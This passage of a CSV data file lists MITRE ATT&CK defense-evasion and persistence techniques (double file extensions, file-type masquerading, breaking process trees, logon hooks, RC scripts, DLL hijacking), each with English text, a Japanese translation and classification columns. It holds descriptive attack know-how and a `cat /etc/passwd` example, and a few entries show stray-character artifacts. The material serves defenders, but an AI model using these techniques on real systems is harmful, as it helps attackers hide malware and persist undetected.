back）。攻撃者はこの機能を利用し、ユーザーを騙して一見無害な形式のファイルをダブルクリックさせ、最終的に悪意のあるプログラムを実行させることが可能です。,defense-evasion,Linux;macOS,other,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86,2020-02-10T20:47:10.082Z,2025-04-25T14:48:22.412Z,,,,
T1036.007,T1036,Double File Extension,二重ファイル拡張子,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension) Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.","攻撃者は、ファイル名に二重拡張子を使用することで真のファイルタイプを偽装する可能性があります。ファイル名に二次的なファイルタイプ拡張子が含まれる場合、最初の拡張子のみが表示されることがあります（例：<code>File.txt.exe</code> が一部の表示環境では <code>File.txt</code> と表示される）。しかし、真のファイルタイプは二次拡張子であり、これがファイルの開かれ方や実行方法を決定します。 実際のファイル拡張子は、ファイルブラウザ（例：explorer.exe）やシステムポリシーを使用するソフトウェアで隠蔽される場合があります（引用元：PCMag DoubleExtension）（引用元：SOCPrime DoubleExtension）。攻撃者は二重拡張子を悪用し、ペイロードの危険なファイルタイプを隠蔽しようと試みます。 非常に一般的な使用法は、ユーザーを騙して、一見無害なファイルタイプであると思わせるが、実際には実行可能コードであるファイルを開かせることです。 こうしたファイルはメール添付ファイルを装うことが多く、攻撃者が[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001)を介してユーザーのシステムに[初期アクセス](https://attack.mitre.org/tactics/TA0001)を得た後、 [ユーザー実行](https://attack.mitre.org/techniques/T1204)によってシステムへの初期アクセスを可能にします。例えば、<code>Evil.txt.exe</code>という名前の実行可能ファイル添付は、ユーザーには<code>Evil.txt</code>として表示される場合があります。ユーザーはこれを無害なテキストファイルと見なして開いてしまい、意図せず隠されたマルウェアを実行してしまうのです。(引用元: SOCPrime DoubleExtension) テキストファイル(.txt, .docなど)や画像ファイル(.jpg, .gifなど)といった一般的なファイル形式が、一見無害に見える最初の拡張子として使用されるのが一般的です。危険と見なされる実行可能拡張子(.exe, .lnk, .hta, .scrなど)は、多くの場合、2番目の拡張子として表示され、真のファイルタイプを示します。",defense-evasion,Windows,other,stealth,user_interaction;endpoint_execution;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e,2021-08-04T20:54:03.066Z,2025-04-15T22:23:40.712Z,,,,
T1036.008,T1036,Masquerade File Type,偽装ファイルタイプ,"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file, is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign. Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension. Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",攻撃者は、ペイロードのフォーマット変更（ファイルの署名、拡張子、アイコン、内容を含む）を通じて、悪意のあるペイロードを正当なファイルに偽装することがあります。様々なファイルタイプには、エンコード方法や構成方法を含む典型的な標準フォーマットが存在します。 例えば、ファイルの署名（ヘッダーまたはマジックバイトとも呼ばれる）はファイルの先頭バイトであり、ファイルの種類を識別するために頻繁に使用されます。例えば、JPEGファイルのヘッダーは<code> 0xFF 0xD8</code>であり、ファイル拡張子は`.JPE`、`.JPEG`、または`.JPG`のいずれかです。 攻撃者は、ファイル検証チェックや入力サニタイズを回避するため、悪意のあるペイロードのヘッダーの16進コードやファイル拡張子を改変することがあります。この手法は、ペイロードファイルの転送（例：[侵入ツール転送](https://attack.mitre.org/techniques/T1105)）や保存（例： [マルウェアアップロード](https://attack.mitre.org/techniques/T1608/001)) される場合によく見られ、これにより攻撃者は検知を回避しつつマルウェアを移動させることが可能となります。 テキストファイル（`.txt`）や画像ファイル（`.jpg`、`.gif`など）といった一般的な非実行ファイル形式・拡張子は通常、無害と見なされる。この特性を利用し、攻撃者はファイル拡張子でマルウェアを偽装する。例えばPHPバックドアコードを<code>test.gif</code>というファイル名で保存する手法がある。ユーザーは無害な外観と拡張子から、ファイルが悪意あるものであることに気付かない可能性がある。 ポリゴットファイル（複数の異なるファイルタイプを持ち、実行するアプリケーションによって異なる機能を発揮するファイル）も、悪意のあるマルウェアや機能を偽装するために使用される可能性があります。（引用元: polygot_icedID）,defense-evasion,Linux;macOS;Windows,data_exfiltration,stealth,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471,2023-03-08T22:40:06.918Z,2025-04-15T19:58:12.855Z,,,,
T1036.009,T1036,Break Process Trees,プロセスツリーの破壊,"An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child"" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree. Another example is using the “daemon Esyscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",攻撃者は、実行中のマルウェアの親プロセスID（PPID）を変更することで、プロセスツリーベースの分析を回避しようとする可能性がある。エンドポイント保護ソフトウェアが「親子」関係を検知に利用している場合、この関係を断ち切ることで、攻撃者の行動が以前のプロセスツリー活動と関連付けられなくなる可能性がある。 Unixベースのシステムでは、管理者がスクリプトやプログラムを使用してソフトウェアを実行する際、このプロセスツリーを破壊することは一般的な手法である。(引用: 3OHA double-fork 2022) Linuxシステムでは、攻撃者は一連の[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しを実行してマルウェアのプロセスツリーを変更する可能性がある。 例えば、攻撃者は引数なしでペイロードを実行し、`fork()` APIを2回呼び出した後、親プロセスを終了させることができます。これにより親プロセスを持たない孫プロセスが生成され、直ちにシステムプロセス`init`（PID 1）に養子縁組されます。これにより、攻撃者のペイロードの実行が以前のプロセスツリーから完全に切り離されます。 別の例として、「デーモン」Esyscallを使用して現在の親プロセスから分離し、バックグラウンドで実行する方法がある。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022),defense-evasion,Linux;macOS,script_command_execution,stealth,authentication_system;privileged_account;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--34a80bc4-80f2-46e6-94ff-f3265a4b657c,2023-09-27T19:49:40.815Z,2025-04-15T21:54:02.243Z,,,,
T1036.010,T1036,Masquerade Account Name,アカウント名の偽装,"Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur during [Create Account](https://attack.mitre.org/techniques/T1136), although accounts may also be renamed at a later date. This may also coincide with [Account Access Removal](https://attack.mitre.org/techniques/T1531) if the actor first deletes an account before re-creating one with the same name.(Citation: Huntress MOVEit 2023) Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.(Citation: Elastic CUBA Ransomware 2022)(Citation: Aquasec Kubernetes Attack 2023) They may also give accounts generic, trustworthy names, such as “admin E “help E or “root. ECitation: Invictus IR Cloud Ransomware 2024) Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior to [Account Discovery](https://attack.mitre.org/techniques/T1087). Note that this is distinct from [Impersonation](https://attack.mitre.org/techniques/T1656), which describes impersonating specific trusted individuals or organizations, rather than user or service account names.",攻撃者は、新規作成したアカウントを無害に見せかけるため、正当なアカウント名と一致させるか近似させる場合があります。これは通常、[アカウント作成](https://attack.mitre.org/techniques/T1136)時に発生しますが、後日アカウント名が変更される場合もあります。 攻撃者がまずアカウントを削除し、同じ名前で再作成する場合、これは[アカウントアクセス削除](https://attack.mitre.org/techniques/T1531)と同時に行われることもある。(引用元: Huntress MOVEit 2023) 多くの場合、攻撃者は正当なソフトウェア、データバックアップ、コンテナクラスター管理に関連するものなど、サービスアカウントを装おうとする。(引用: Elastic CUBA Ransomware 2022)(引用: Aquasec Kubernetes Attack 2023) また、「admin」「help」「root」など、汎用的で信頼性のある名前をアカウントに付ける場合もあります。(引用: Invictus IR Cloud Ransomware 2024) 攻撃者は、[アカウント発見](https://attack.mitre.org/techniques/T1087)の追随行動として、システム内に既に存在するアカウント名を模倣する場合もある。 これは、ユーザー名やサービスアカウント名ではなく、特定の信頼できる個人や組織を偽装する「なりすまし」とは異なります。,defense-evasion,Linux;macOS;Windows;SaaS;IaaS;Containers;Office Suite;Identity Provider,destructive_impact,stealth,authentication_system;privileged_account;user_interaction;cloud_control_plane,specified,Backup Server;Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--d349c66e-18e1-4d8b-a2d7-65af7cbd2ba0,2024-08-05T21:39:16.274Z,2025-04-15T22:48:14.966Z,,,,
T1036.011,T1036,Overwrite Process Arguments,プロセス引数の上書き,"Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory at launch, this modification can be performed without elevated privileges. During runtime, adversaries can erase the memory used by all command-line arguments for a process, overwriting each argument string with null bytes. This removes evidence of how the process was originally launched. They can then write a spoofed string into the memory region previously occupied by `argv[0]` to mimic a benign command, such as `cat resolv.conf`. The new command-line string is reflected in `/proc/<PID>/cmdline` and displayed by tools like `ps`.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022)",攻撃者は、プロセスを正当または無害なプロセスに見せかけるため、プロセスのメモリ内引数を変更してその名前を変更する可能性があります。Linuxでは、オペレーティングシステムはコマンドライン引数をプロセスのスタックに格納し、`argv`配列として`main()`関数に渡します。 最初の要素である`argv[0]`には通常、プロセス名またはパス（デフォルトではプロセスを実際に起動するコマンド、例：`cat /etc/passwd`）が含まれます。Linuxの`/proc`ファイルシステムはデフォルトでこの値をプロセス名として使用します。`/proc/<PID>/cmdline`ファイルはこのメモリ内容を反映しており、`ps`などのツールはこれを使用してプロセス情報を表示します。 引数は起動時にユーザー空間メモリに格納されるため、この改変は昇格された権限なしで実行可能です。実行中に攻撃者は、プロセスの全コマンドライン引数が使用されるメモリ領域を消去し、各引数文字列をヌルバイトで上書きできます。これにより、プロセスが当初どのように起動されたかの証拠が消去されます。その後、攻撃者は`argv[0]`が占めていたメモリ領域に偽装文字列を書き込むことで、`cat resolv.conf`のような無害なコマンドを模倣できます。 この新たなコマンドライン文字列は`/proc/<PID>/cmdline`に反映され、`ps`などのツールによって表示される。(引用: Sandfly BPFDoor 2022)(引用: Microsoft XorDdos Linux Stealth 2022),defense-evasion,Linux,script_command_execution,stealth,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--514dc7b3-0b80-4382-80a9-2e2d294f5019,2025-03-27T20:37:52.269Z,2025-04-15T19:58:30.391Z,,,,
T1037,,Boot or Logon Initialization Scripts,ブートまたはログオン初期化スクリプト,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely. Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",攻撃者は、ブート時またはログオン時の初期化で自動的に実行されるスクリプトを利用して永続性を確立することがある。(引用: Mandiant APT29 Eye Spy Email Nov 22)(引用: Anomali Rocke March 2019) 初期化スクリプトは管理機能を実行するために使用され、他のプログラムを実行したり内部ログサーバーに情報を送信したりすることが多い。これらのスクリプトはオペレーティングシステムやローカル/リモート適用によって異なる。 攻撃者はこれらのスクリプトを利用して単一システム上で永続性を維持する可能性がある。ログオンスクリプトのアクセス設定によっては、ローカル認証情報または管理者アカウントが必要となる場合がある。また、一部の起動時またはログオン時の初期化スクリプトはより高い権限で実行されるため、攻撃者は権限昇格を行うことも可能である。,persistence;privilege-escalation,macOS;Windows;Linux;Network Devices;ESXi,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Mail / Collaboration;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334,2017-05-31T21:30:38.910Z,2025-04-15T19:58:02.121Z,,,,
T1037.001,T1037,Logon Script (Windows),ログオンスクリプト（Windows）,"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.(Citation: TechNet Logon Scripts) This is done via adding a path to a script to the <code>HKCU\Environment\UserInitMprLogonScript</code> Registry key.(Citation: Hexacorn Logon Scripts) Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",攻撃者は、ログオン初期化時に自動的に実行されるWindowsログオンスクリプトを利用して永続性を確立する可能性がある。Windowsでは、特定のユーザーまたはユーザーグループがシステムにログオンするたびにログオンスクリプトを実行できる（引用元: TechNet Logon Scripts）。これは、スクリプトへのパスを<code>HKCU\Environment\UserInitMprLogonScript</code>レジストリキーに追加することで実現される。(引用元: Hexacorn Logon Scripts) 攻撃者はこれらのスクリプトを利用して単一システム上で永続性を維持する可能性があります。ログオンスクリプトのアクセス設定によっては、ローカル認証情報または管理者アカウントが必要となる場合があります。,persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--eb125d40-0b2d-41ac-a71a-3229241c2cd3,2020-01-10T03:43:37.211Z,2025-04-15T22:46:59.108Z,,,,
T1037.002,T1037,Login Hook,ログインフック,"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) Adversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter) **Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001)",攻撃者は、ユーザーログオン時に実行される永続性を確立するためにログインフックを使用する可能性があります。 ログインフックは、ユーザーログオン時にルート権限で実行する特定スクリプトを指すplistファイルである。このplistファイルは<code>/Library/Preferences/com.apple.loginwindow.plist</code>に配置され、<code>defaults</code>コマンドラインユーティリティで変更可能である。この動作はログアウトフックでも同様であり、ユーザーログアウト時にスクリプトを実行できる。 すべてのフックの変更または作成には管理者権限が必要です。(引用元: Login Scripts Apple Dev)(引用元: LoginWindowScripts Apple Dev) 攻撃者は<code>com.apple.loginwindow.plist</code>ファイル内の<code>LoginHook</code>または<code>LogoutHook</code>キー値ペアを使用して、悪意のあるスクリプトへのパスを追加または挿入できます。 悪意のあるスクリプトは次回のユーザーログイン時に実行されます。ログインフックが既に存在する場合、攻撃者は既存のフックに追加コマンドを挿入できます。システム上で同時に有効なログインフックとログアウトフックは1つずつです。（引用元：S1 macOS Persistence）（引用元：Wardle Persistence Chapter）**注：** macOS 10.11 以降では、ログインフックは廃止され、代わりに [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) および [Launch Agent](https://attack.mitre.org/techniques/T1543/001) が推奨されています。,persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0,2020-01-10T16:01:15.995Z,2025-04-15T22:46:43.054Z,,,,
T1037.003,T1037,Network Logon Script,ネットワークログオンスクリプト,"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems. Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",攻撃者は、ログオン初期化時に自動的に実行されるネットワークログオンスクリプトを利用して永続性を確立する可能性があります。ネットワークログオンスクリプトは、Active Directory またはグループポリシーオブジェクトを使用して割り当てられます。(引用元: Petri Logon Script AD) これらのログオンスクリプトは、割り当てられたユーザーの権限で実行されます。ネットワーク内のシステムによっては、これらのスクリプトのいずれかを初期化すると、複数のシステム、場合によってはすべてのシステムに適用される可能性があります。 攻撃者はこれらのスクリプトを利用してネットワーク上で永続性を維持する可能性がある。ログオンスクリプトのアクセス設定によっては、ローカル認証情報または管理者アカウントが必要となる場合がある。,persistence;privilege-escalation,Windows,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--c63a348e-ffc2-486a-b9d9-d7f11ec54d99,2020-01-10T18:01:03.666Z,2025-04-15T22:51:42.187Z,,,,
T1037.004,T1037,RC Scripts,RCスクリプト,"Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify. Adversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence. Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022) Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",攻撃者は、Unix系システムの起動時に実行されるRCスクリプトを改変することで永続性を確立する可能性がある。これらのファイルは、システム管理者が異なるランレベルで起動時にカスタムサービスをマッピングおよび開始することを可能にする。RCスクリプトの改変にはroot権限が必要である。 攻撃者は、<code>rc.local</code>、<code>rc.common</code>、およびUnix系ディストリビューション固有のその他のRCスクリプトに悪意のあるバイナリパスやシェルコマンドを追加することで永続性を確立する可能性がある。(引用: IranThreats Kittens Dec 2017)(引用: Intezer HiddenWasp Map 2019) 再起動時、システムはスクリプトの内容をroot権限で実行し、永続化をもたらす。 攻撃者によるRCスクリプトの悪用は、ESXiハイパーバイザー、IoT、組込みシステムなど、rootユーザーをデフォルトで使用する軽量Unix系ディストリビューションで特に効果的です。(引用: intezer-kaiji-malware) ESXiサーバーはほとんどのシステムファイルをメモリに保存するためシャットダウン時に変更が破棄されるため、`/etc/rc.local.d/local.sh`の活用は再起動後も永続性を維持する数少ない手段の一つです。(引用元: Juniper Networks ESXi Backdoor 2022) 複数のUnix系システムはSystemdに移行し、RCスクリプトの使用を非推奨としています。macOSにおいても[Launchd](https://attack.mitre.org/techniques/T1053/004)が推奨されるため、これは現在非推奨のメカニズムです。(引用元: Apple Developer Doco Archive Launchd)(引用元: Startup Items) この手法は、RCスクリプトを実行するMac OS X Panther v10.3およびそれ以前のバージョンで使用可能です。(引用元: Methods of Mac Malware Persistence) 後方互換性を維持するため、Ubuntuなどの一部のシステムでは、適切なファイル権限を持つRCスクリプトが存在する場合に実行されます。(引用元: Ubuntu Manpage systemd rc),persistence;privilege-escalation,macOS;Linux;Network Devices;ESXi,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211,2020-01-15T16:25:22.260Z,2025-04-15T19:59:13.566Z,,,,
T1037.005,T1037,Startup Items,スタートアップ項目,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items) This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",攻撃者は、起動初期化時に自動的に実行されるスタートアップ項目を利用して永続性を確立する可能性があります。スタートアップ項目は起動プロセスの最終段階で実行され、シェルスクリプトやその他の実行可能ファイル、およびシステムが全スタートアップ項目の実行順序を決定するために使用する設定情報を含みます。(引用: Startup Items) 技術的には非推奨技術（[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)に置き換えられた）であるため、対応するフォルダ<code>/Library/StartupItems</code>がデフォルトでシステムに存在することは保証されないが、macOS Sierraではデフォルトで存在しているようだ。 スタートアップ項目とは、実行ファイルと設定プロパティリスト（plist）である<code>StartupParameters.plist</code>が最上位ディレクトリに配置されるディレクトリを指します。 攻撃者は、独自の永続化メカニズムを登録するために、StartupItems ディレクトリ内に適切なフォルダ/ファイルを作成することができます（引用元：Mac マルウェアの永続化手法）。さらに、StartupItems は macOS の起動フェーズ中に実行されるため、昇格された root ユーザーとして実行されます。,persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--c0dfe7b0-b873-4618-9ff8-53e31f70907f,2020-01-15T18:00:33.603Z,2025-04-16T20:37:20.168Z,,,,
T1038,,DLL Search Order Hijacking,DLL検索順序の乗っ取り,"Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order) If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",Windowsシステムは、プログラムにロードする必要なDLLを検索する共通の方法を使用します（引用元：Microsoft DLL Search）。攻撃者は、WindowsのDLL検索順序とDLLを曖昧に指定するプログラムを悪用して、特権昇格と永続化を達成する可能性があります。 攻撃者は、DLLプリロード（別名バイナリプランティング攻撃）を実行する可能性があります（引用元：OWASP Binary Planting）。これは、曖昧に指定されたDLLと同じ名前の悪意のあるDLLを、Windowsが正規のDLLよりも先に検索する場所に配置する手法です。この場所は通常、プログラムの現在の作業ディレクトリです。リモートDLLプリロード攻撃は、プログラムがDLLをロードする前に現在のディレクトリをWeb共有などのリモート場所に設定した場合に発生します。 (引用元: Microsoft 2269637) 攻撃者はこの動作を利用して、プログラムに悪意のあるDLLをロードさせることが可能です。また、既存のDLLを置換したり、.manifestファイルや.localリダイレクトファイル、ディレクトリ、ジャンクションを変更することで、プログラムが異なるDLLをロードするよう直接操作し、永続性維持や権限昇格を図ることがあります。 (引用元: Microsoft DLL Redirection) (引用元: Microsoft Manifests) (引用元: Mandiant Search Order) 検索順序脆弱性のあるプログラムがより高い特権レベルで実行されるように設定されている場合、攻撃者が制御するDLLも同様に高い特権レベルで実行されます。 この場合、プログラムによっては、この手法を使用して、ユーザーから管理者または SYSTEM へ、あるいは管理者から SYSTEM へ特権昇格を行うことができます。パスハイジャックの被害を受けたプログラムは、悪意のある DLL が、置き換えるべき正当な DLL もロードするように設定されている場合があるため、正常に動作しているように見える可能性があります。,persistence;privilege-escalation;defense-evasion,Windows,other,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary 